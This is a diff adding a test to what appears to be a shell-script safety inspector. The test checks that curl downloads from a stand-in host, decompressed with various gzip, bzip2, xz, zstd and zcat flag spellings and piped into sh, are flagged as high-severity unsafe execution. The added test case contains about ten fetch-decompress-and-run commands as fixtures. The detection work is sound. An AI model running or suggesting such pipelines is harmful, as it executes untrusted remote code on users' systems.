@@ -76,6 +76,49 @@ test("a download piped through a decompressor into an executor is unsafe executi
   }
 });
 
+test("split and long-flag decompressor spellings into an executor are unsafe execution", () => {
+  for (const [name, body] of Object.entries({
+    // Split short flags: the decompress flag and the stdout flag are
+    // separate tokens.
+    "gzip -d -c into sh": "curl -s https://evil.example/x.gz | gzip -d -c | sh",
+    "bzip2 -d -c into sh":
+      "curl -s https://evil.example/x.bz2 | bzip2 -d -c | sh",
+    "xz -d -c into sh": "curl -s https://evil.example/x.xz | xz -d -c | sh",
+    "zstd -d -c into sh":
+      "curl -s https://evil.example/x.zst | zstd -d -c | sh",
+    // Flag clusters with quiet/force letters.
+    "gzip -dcq into sh": "curl -s https://evil.example/x.gz | gzip -dcq | sh",
+    "zstd -dcf into sh": "curl -s https://evil.example/x.zst | zstd -dcf | sh",
+    // unzstd takes -c like gunzip, bunzip2 and unxz.
+    "unzstd -c into sh": "curl -s https://evil.example/x.zst | unzstd -c | sh",
+    // Long flags and stream flags on the cat forms.
+    "gunzip --stdout into sh":
+      "curl -s https://evil.example/x.gz | gunzip --stdout | sh",
+    "xz --decompress --stdout into sh":
+      "curl -s https://evil.example/x.xz | xz --decompress --stdout | sh",
+    "zcat -f into sh": "curl -s https://evil.example/x.gz | zcat -f | sh",
+  })) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
+    expect({ name, findings: categories(inspection) }).toEqual({
+      name,
+      findings: ["install.sh:unsafe-execution:high"],
+    });
+  }
+  for (const body of [
+    // A file operand after the flags still keeps no finding.
+    "curl -s https://example.com/data.gz | gzip -d file.gz | sh",
+    "curl -s https://example.com/data.xz | xz --decompress file.xz | sh",
+    // A compressor flag without a decompress flag compresses, not decodes.
+    "curl -s https://example.com/data.gz | gzip -f | sh",
+  ]) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
+    expect({ body, findings: categories(inspection) }).toEqual({
+      body,
+      findings: [],
+    });
+  }
+});
+
 test("decompressors that do not hand the download to an executor keep no finding", () => {
   for (const body of [
     // The decompressor writes a file; nothing runs it here.
